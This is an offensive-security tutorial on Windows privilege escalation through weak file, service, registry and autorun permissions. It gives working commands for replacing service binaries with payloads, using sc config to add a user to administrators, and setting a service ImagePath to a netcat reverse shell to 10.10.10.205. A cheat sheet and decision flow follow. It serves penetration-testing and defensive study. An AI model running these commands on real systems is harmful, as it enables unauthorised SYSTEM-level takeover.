# Attacking the OS, Part 2: Weak Permissions

## Table of Contents
1. [Why Permissions Are a Rich Target](#1-why-permissions-are-a-rich-target)
2. [Permissive File System ACLs (Replacing a Service's .exe)](#2-permissive-file-system-acls-replacing-a-services-exe)
3. [Weak Service Permissions (Reconfiguring a Service Directly)](#3-weak-service-permissions-reconfiguring-a-service-directly)
4. [Unquoted Service Paths](#4-unquoted-service-paths)
5. [Permissive Registry ACLs](#5-permissive-registry-acls)
6. [Modifiable Registry Autorun Binaries](#6-modifiable-registry-autorun-binaries)
7. [Cheat Sheet](#7-cheat-sheet)
8. [Big-Picture Takeaways](#8-big-picture-takeaways)

---

## 1. Why Permissions Are a Rich Target

Windows permissions are notoriously intricate — so intricate that a small, well-intentioned change in one place can quietly create a security hole somewhere else entirely. As a result, permission-based privilege escalation flaws are:

- **Relatively rare** in polished software from large, security-conscious vendors (though they do occasionally slip through),
- **Common** in smaller third-party software, open-source tools, and custom in-house applications.

**Why this matters so much:** Windows **services** are very often installed to run as `NT AUTHORITY\SYSTEM` — the most powerful account on the machine. If you can find a permissions mistake affecting *how* a service is configured or where its files live, you can often ride that mistake all the way to full SYSTEM control.

**Analogy:** Think of a service running as SYSTEM like a company's most senior courier, who's trusted to walk into any office unquestioned. If the *lock on the courier's own equipment closet* is broken, anyone can swap what's inside that closet — and the courier will still be let into every office carrying whatever they find there, no questions asked.

It's valuable to be able to spot these issues **both with automated tools and manually**, since some engagements won't let you bring in external tooling at all.

---

## 2. Permissive File System ACLs (Replacing a Service's .exe)

The simplest version of this flaw: a service's actual executable file sits in a folder where regular users are allowed to overwrite it.

### Step 1 — Find a candidate with SharpUp

[SharpUp](https://github.com/GhostPack/SharpUp/) (from the GhostPack suite of offensive security tools) automates hunting for this exact issue:

```
PS C:\evilcorp> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
*(The tool's output continues with additional findings, trimmed here since this one entry is sufficient to demonstrate the technique.)*

### Step 2 — Confirm manually with `icacls`

Using [icacls](https://ss64.com/nt/icacls.html) we can verify the vulnerability
```
PS C:\evilcorp> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```

**How to read `icacls` output:** each line shows a user/group, followed by their rights in parentheses.

| Abbreviation | Meaning |
|---|---|
| `(F)` | **Full control** |
| `(RX)` | Read & Execute only |
| `(I)` | This permission was **inherited** from the parent folder, not set directly on this file |

Both `BUILTIN\Users` (ordinary logged-in users) and `Everyone` (literally anyone, including unauthenticated/guest contexts) have `(F)` — **full control** — over this specific service executable. That's a serious misconfiguration: the file should normally only be writable by Administrators/SYSTEM.

### Step 3 — Replace the binary and trigger it

Since the service is also configured to be startable by unprivileged users, the attack is straightforward: swap in a malicious executable (generated with `msfvenom`, for example) in place of the real one, then start the service to run it with SYSTEM privileges.

```
C:\evilcorp> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\evilcorp> sc start SecurityService
```

This malicious binary could open a reverse shell as SYSTEM, add a new local administrator account, or do essentially anything else you choose to put in its place.

---

## 3. Weak Service Permissions (Reconfiguring a Service Directly)

A related but distinct flaw: instead of the *file* having weak permissions, the **service's own configuration** (as managed by Windows' Service Control Manager) might be directly editable by unprivileged users — letting you redirect what command the service runs, without ever touching its actual executable file.

### Step 1 — Spot it with SharpUp

```
C:\evilcorp> SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Services ===

  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

### Step 2 — Confirm with AccessChk

Next, we'll use [AccessChk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service. 
```
C:\evilcorp> accesschk.exe /accepteula -quvcw WindscribeService

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright (C) 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

| Flag | Meaning |
|---|---|
| `-q` | Omit the tool's banner |
| `-u` | Suppress error messages |
| `-v` | Verbose output |
| `-c` | Specify this is a Windows **service** name being checked |
| `-w` | Show only objects that have write access granted |

The critical finding: **`NT AUTHORITY\Authenticated Users`** — essentially any logged-in domain or local account — has `SERVICE_ALL_ACCESS`, meaning full read **and write** control over the service's configuration. That's a severe misconfiguration; this level of control should be reserved for SYSTEM and Administrators only.

### Step 3 — Confirm you're not already an admin

```
C:\evilcorp> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
mickey
The command completed successfully.
```
Confirmed: the current user, `john`, is **not** in this list.

### Step 4 — Hijack the service's startup command

Rather than replacing a file, you directly reconfigure what the Service Control Manager runs when the service starts:

```
C:\evilcorp> sc config WindscribeService binpath="cmd /c net localgroup administrators john /add"

[SC] ChangeServiceConfig SUCCESS
```

> **Practical syntax note:** Windows' `sc.exe` is picky about spacing — the real-world working syntax is `binPath= <value>` (**no space before the `=`, but a space required immediately after it**). Some of the commands shown in this walkthrough omit that required space; if you find a command like this doesn't work as typed, double-check you have a space right after `binPath=`.

### Step 5 — Stop and restart the service to trigger the payload

```
C:\evilcorp> sc stop WindscribeService

SERVICE_NAME: WindscribeService
        STATE              : 3  STOP_PENDING
```

```
C:\evilcorp> sc start WindscribeService

[SC] StartService FAILED 1053:
The service did not respond to the start or control request in a timely fashion.
```

**This "failure" is actually expected and fine.** The service manager still briefly attempts to execute whatever is in `binPath` — which is now your injected command — before giving up because that command doesn't actually behave like a real, long-running Windows service. The command still runs successfully in that brief window.

### Step 6 — Confirm the result

```
C:\evilcorp> net localgroup administrators

Members
-------------------------------------------------------------------------------
Administrator
john
mickey
The command completed successfully.
```

Success — `john` is now a local administrator.

### A Real-World Example: CVE-2019-1322

The **Windows Update Orchestrator Service (`UsoSvc`)** — a core, un-removable Windows service responsible for downloading and installing OS updates, and which runs as `NT AUTHORITY\SYSTEM` — was itself affected by this exact style of flaw (tracked as **CVE-2019-1322**) before Microsoft patched it. The weak permissions on that service allowed ordinary service accounts to modify its binary path and start/stop it, escalating straight to SYSTEM — a strong reminder that even core, built-in Windows components aren't automatically immune to these misconfigurations.

### Cleaning Up

Since this is a real, functioning VPN service you've just broken, it's good practice (and often required on a real engagement) to restore it properly afterward:

```
C:\evilcorp> sc config WindscribeService binPath="\"C:\Program Files (x86)\Windscribe\WindscribeService.exe\""

[SC] ChangeServiceConfig SUCCESS
```
Confirm the path was restored correctly:
```
C:\evilcorp> sc qc WindscribeService

BINARY_PATH_NAME   : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
SERVICE_START_NAME : LocalSystem
```
*(Several other configuration fields — `TYPE`, `START_TYPE`, `ERROR_CONTROL`, `LOAD_ORDER_GROUP`, `TAG`, `DISPLAY_NAME`, `DEPENDENCIES` — were trimmed since they were unchanged and not relevant to confirming the fix.)*

Start it back up and confirm it's healthy again:
```
C:\evilcorp> sc start WindScribeService

STATE              : 2  START_PENDING
PID                : 1716
```
```
C:\evilcorp> sc query WindScribeService

STATE              : 4  Running
                       (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
```

---

## 4. Unquoted Service Paths

This is a more subtle flaw rooted in **how Windows parses file paths containing spaces.**

### The Core Problem

When a service is registered, its configuration specifies the exact binary (`.exe`) to launch. If that path contains spaces **and isn't wrapped in quotation marks**, Windows doesn't actually know where the real filename ends and folder names begin — so it tries several interpretations, working left to right.

**Analogy:** Imagine giving someone driving directions as "turn at Park Avenue Plaza Building" with no punctuation. Is the destination called "Park," on "Avenue Plaza Building" street? Or is "Park Avenue" the street name, heading to "Plaza Building"? Without clear delimiters, a literal-minded assistant might try multiple interpretations in sequence, checking each one in turn — and if an impostor had placed a convincing decoy at the *first* interpretation checked, they'd arrive there and stop, never reaching the real destination.

Take this unquoted path as an example:
```
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```
Windows doesn't need an explicit `.exe` extension specified to know how to execute a file — it decides execution method based on file extension. So it tries each of the following, in order, treating each as a potential executable (with `.exe` implied):

```
C:\Program
C:\Program Files
C:\Program Files (x86)\System
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64
```

### Confirming the Vulnerable Service

```
C:\evilcorp> sc qc SystemExplorerHelpService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        SERVICE_START_NAME : LocalSystem
```

**Note the complete absence of quotation marks around the path** — that's the actual vulnerability signature you're looking for.

### Why This Is Usually Hard to Actually Exploit

If you could create a malicious file at one of the earlier, shorter candidate paths — say:
```
C:\Program.exe
C:\Program Files (x86)\System.exe
```
— you'd hijack execution before Windows ever reached the real, intended binary, running your code as `NT AUTHORITY\SYSTEM` (since that's what this service runs as).

**However**, there's a major catch: **creating files directly in the root of the C: drive, or inside the `Program Files` folder, normally requires administrative privileges in the first place** — the very thing you're trying to obtain. Even in a rare case where this had been misconfigured to allow it, you'd typically still need the service to *restart* to trigger your hijacked file — and as an unprivileged user, you likely can't force that restart yourself; you'd be stuck waiting for a natural system reboot.

**Bottom line:** unquoted service paths are actually fairly common to *find*, but genuinely exploitable instances are comparatively rare, precisely because of this write-permission catch.

### Searching for Unquoted Service Paths

```
C:\evilcorp> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

GVFS.Service                 GVFS.Service                 C:\Program Files\GVFS\GVFS.Service.exe                    Auto
System Explorer Service      SystemExplorerHelpService    C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe  Auto
WindscribeService             WindscribeService           C:\Program Files (x86)\Windscribe\WindscribeService.exe    Auto
```

**Breaking down this command:**
- `wmic service get name,displayname,pathname,startmode` — lists every installed service with its binary path.
- `findstr /i "auto"` — keeps only services set to start automatically (more interesting, since they'll reliably run without needing to be manually triggered).
- `findstr /i /v "c:\windows\\"` — filters **out** anything living inside the trusted `C:\Windows\` folder (since those are default OS binaries, not useful targets).
- `findstr /i /v """` — filters **out** any path that already contains a quotation mark (since those are already safely quoted and not vulnerable to this specific issue).

What's left is exactly the list of auto-starting, non-Windows, **unquoted** service paths worth investigating further.

---

## 5. Permissive Registry ACLs

Beyond files and the Service Control Manager's own interface, a service's configuration also lives directly in the **Windows Registry** — and that registry key itself can sometimes have weak permissions, letting you edit the service's settings directly, bypassing `sc.exe` entirely.

### Finding Weak Registry Permissions

```
C:\evilcorp> accesschk.exe /accepteula "mickey" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright (C) 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS
```
*(Additional registry key findings from the same scan were omitted here — one clear example is sufficient to demonstrate the technique.)*

The `-k` flag tells AccessChk to check **registry keys** rather than files or services. The result shows the user `mickey` has `KEY_ALL_ACCESS` — full control — over this particular service's registry entry.

### Exploiting It with PowerShell

Rather than going through `sc.exe`, you can edit the registry value directly:
```
PS C:\evilcorp> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

This directly overwrites the `ImagePath` registry value — functionally identical in effect to using `sc config ... binPath=`, but achieved purely through registry permissions instead of service-management permissions. Once the service is stopped and restarted (the same way as in Section 3), this new command runs in its place.

---

## 6. Modifiable Registry Autorun Binaries

The final weak-permissions angle covered here targets **autorun entries** — programs configured to launch automatically, either at system boot or when a specific user logs in.

**The idea:** if you have write access to the registry key storing an autorun entry, or if you can simply overwrite the binary file that entry points to, your code will automatically run **the next time that configured user logs in** — potentially a much more privileged user than you currently are.

### Listing Startup Programs

```
PS C:\evilcorp> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

Name     : OneDrive
command  : "C:\Users\mickey\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mickey

Name     : Windscribe
command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mickey

Name     : SecurityHealth
command  : %windir%\system32\SecurityHealthSystray.exe
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware User Process
command  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public
```

**How to interpret this:**

| Column | What it tells you |
|---|---|
| `Location` | Which registry "Run" key this entry lives under — `HKU\...` (a specific user's own autorun entries) vs. `HKLM\...` (machine-wide, affecting every user who logs in) |
| `User` | Whose login session triggers this program — a specific named account, or `Public` (anyone who logs in) |

**The attack logic:** if you have write access to one of these registry keys, or to the actual target binary referenced in `command` (e.g., `OneDrive.exe` or `Windscribe.exe` above), replacing it means **your code runs automatically the next time that user (or any user, for the `HKLM`/`Public` entries) logs in** — turning a passive wait into a reliable privilege escalation path, especially valuable if the account that logs in later happens to be an administrator.

This [post](https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html) and this [site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) detail many potential autorun locations on Windows systems.

---

## 7. Cheat Sheet

| Goal | Command / Tool |
|---|---|
| Scan for modifiable service binaries/configs | `SharpUp.exe audit` |
| Check file permissions manually | `icacls "<path>"` |
| Check service permissions manually | `accesschk.exe /accepteula -quvcw <servicename>` |
| Change a service's startup command | `sc config <servicename> binPath= "<command>"` |
| Stop / start a service | `sc stop <servicename>` / `sc start <servicename>` |
| Query a service's current configuration | `sc qc <servicename>` |
| Query a service's running status | `sc query <servicename>` |
| Search for auto-start, non-Windows, unquoted service paths | `wmic service get name,displayname,pathname,startmode \| findstr /i "auto" \| findstr /i /v "c:\windows\\" \| findstr /i /v """` |
| Check registry permissions on services | `accesschk.exe /accepteula "<user>" -kvuqsw hklm\System\CurrentControlSet\services` |
| Edit a service's registry ImagePath directly | `Set-ItemProperty -Path <registry path> -Name "ImagePath" -Value "<command>"` |
| List autorun/startup programs | `Get-CimInstance Win32_StartupCommand \| select Name, command, Location, User \| fl` |

### Decision Flow: "Which Weak-Permissions Angle Applies Here?"

```
                ┌─────────────────────────────┐
                │  Run SharpUp.exe audit /    │
                │  manual enumeration         │
                └──────────────────┬──────────┘
                                   │
     ┌───────────────┬─────────────┼───────────────┬───────────────────┐
     ▼               ▼             ▼               ▼                   ▼
 Service .exe   Service config  Unquoted       Registry key      Autorun entry
 file itself    editable via    service path   for the service   (HKLM/HKU Run
 is writable    sc.exe/        found            itself writable  key) or its
 (icacls)       AccessChk                       (accesschk -k)   target binary
     │               │           │               │               is writable
     ▼               ▼           ▼               ▼                    │
 Replace the    Reconfigure    Can you write   Set-ItemProperty       ▼
 .exe with a    binPath to     to C:\ root or  to change            Replace binary
 malicious      run your       Program Files   ImagePath directly  or add your own
 payload        command         folder AND     (bypasses sc.exe)   entry; wait for
     │               │          restart the         │                that user to
     ▼               ▼          service?            ▼                log in
 Start service  Stop/start         │          Stop/start service        │
 → SYSTEM       service →    ┌─────┴─────┐    → runs your command       ▼
 (or chosen     runs command │ Yes       │ No (common)               Code runs as
 payload)       → SYSTEM     ▼           ▼                           that user
                         Exploitable   Note the finding,
                         (rare)        likely not exploitable
                                       without a reboot you
                                       can't force
```

---

## 8. Big-Picture Takeaways

1. Services running as SYSTEM are a frequent, high-value target precisely because of how often small permission mistakes creep into their configuration, file, or registry permissions.
2. Weak permissions show up in at least four distinct places for the same underlying service: the executable **file** itself, the service's **configuration** (via `sc.exe`/Service Control Manager), the service's **registry key**, and related **autorun** entries — always check all of them.
3. Automated tools like SharpUp and AccessChk make initial discovery fast, but understanding the manual commands (`icacls`, `sc qc`, `accesschk.exe`) matters when tooling isn't available.
4. A service that's both misconfigured **and** startable by an unprivileged user is the ideal combination — you need both pieces (the weak permission *and* the ability to trigger a restart) to reliably exploit it.
5. Unquoted service paths are easy to find but frequently *not* exploitable in practice, because successfully placing a hijacking file usually requires the very administrative access you're trying to gain.
6. A registry-level permission issue can let you bypass the normal `sc.exe` interface entirely and edit a service's configuration (like its `ImagePath`) directly — worth checking even when `sc.exe`-level permissions look locked down.
7. Autorun entries extend this whole category of attack beyond services — any program configured to launch at logon is a potential target if its registry entry or target binary is writable by you.
8. Even core, unremovable Windows components (like the Windows Update Orchestrator Service) have historically suffered from exactly this class of vulnerability — proving that "it's a built-in Windows service" is not, by itself, a guarantee of safety.
9. Always clean up after demonstrating one of these techniques on a real assessment — restoring a service's original binary path and confirming it starts correctly again is both professional courtesy and good practice.
